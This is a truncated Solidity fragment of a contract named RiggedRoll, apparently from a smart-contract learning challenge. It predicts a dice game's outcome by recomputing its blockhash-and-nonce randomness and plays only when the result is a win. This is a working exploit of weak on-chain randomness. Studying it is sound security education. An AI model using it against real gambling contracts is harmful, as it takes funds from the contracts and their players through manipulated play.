...
contract RiggedRoll is Ownable {
    ...
    function riggedRoll() public onlyOwner {
        ...
        bytes32 dgPrevHash = blockhash(block.number - 1);
        uint256 dgNonce = diceGame.nonce();
        bytes32 dgHash = keccak256(abi.encodePacked(dgPrevHash, address(diceGame), dgNonce));
        uint256 dgRoll = uint256(dgHash) % 16;

        require(dgRoll <= 2, "Not winning");
        (bool sent, bytes memory data) = address(diceGame).call{value: 0.002 ether}(
